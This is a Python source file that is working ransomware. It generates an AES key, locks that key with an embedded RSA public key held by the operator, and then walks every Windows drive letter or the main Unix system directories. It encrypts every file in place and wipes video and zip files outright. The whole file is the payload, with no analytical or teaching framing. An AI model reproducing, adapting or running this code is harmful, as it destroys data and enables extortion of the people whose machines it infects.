import os
import platform
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto import Random
from multiprocessing import Pool

key = Random.new().read(16)

secure_the_key = RSA.import_key(
    b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2AxNKrtrIX7AT+1rZ7GS\nS8VXj5Hy5+2kTfIOC4MY+XDSbzYsevHOckiFNOe3ZfYIqKuYHStA5H3djZHgSbxc\nYuUZhbcH7kZpYdKx0kIysyC1ERsv7BSKB2zBNx05CPttuDp9qJAJdyt2MoYfuSIj\nKTrOs7t78wDqp4Uq7VCeMaurxX8pGF3hUEuWflxLMmdbbilX1+6X9gBbVDBvXMYr\nXXwJml2wI9casEA7Q3iUTT/jg2tCDOd5+iRLMwgfKxnR/d14KRU7utY+ZuhkEbo/\nBCOWyY32PKfDs2DppwhjymK4UgKiHHIakMCqWDqT19Sn2ViER5nvhls3ADoU3a3s\nbQIDAQAB\n-----END PUBLIC KEY-----')
store = open('data.this_what_i_can_do', 'wb')
secrf = PKCS1_OAEP.new(secure_the_key)
ciphered_key = secrf.encrypt(key)
store.write(ciphered_key)
store.close()

del secure_the_key
del store
del secrf
del ciphered_key


def encrypt(key, o_file):
    block_size = AES.block_size
    with open(o_file, 'rb+') as f:
        iv = Random.new().read(16)
        c = AES.new(key, AES.MODE_OFB, iv)
        plain = f.read(block_size)
        while plain:
            f.seek(-len(plain), 1)
            f.write(c.encrypt(plain))
            plain = f.read(16)
        f.seek(0, 2)
        f.write(iv)
        f.close()


def partition(key, par):
    try:
        for i, f, files in os.walk(par):
            for data in files:
                if '.this_what_i_can_do' in data:
                    pass
                elif ".mp4" in data.lower() or ".mkv" in data.lower() or '.MKV' in data or '.zip' in data.lower():
                    try:
                        deleter = open(i + '/' + data, 'wb+')
                        deleter.close()
                    except:
                        pass
                else:
                    try:
                        p = Pool()
                        p.starmap(encrypt, [(key, i + '/' + data)])
                    except:
                        pass
    except:
        pass


if platform.system() == "Windows":
    # what  i going to do for windows
    paths = []
    for i in range(65, 90):
        if os.path.exists(chr(i) + ":" + "/"):
            paths.append(chr(i) + ":" + "/")
    for h in paths:
        p = Pool()
        p.starmap(partition, [(key, h)])

    pass
else:
    # what i going to do for linux and mac
    p_list = ["/home", "/usr", "/sbin", "/bin",'/']
    for h in p_list:
        try:
            p = Pool()
            p.starmap(partition, [(key, h)])
        except:
            pass
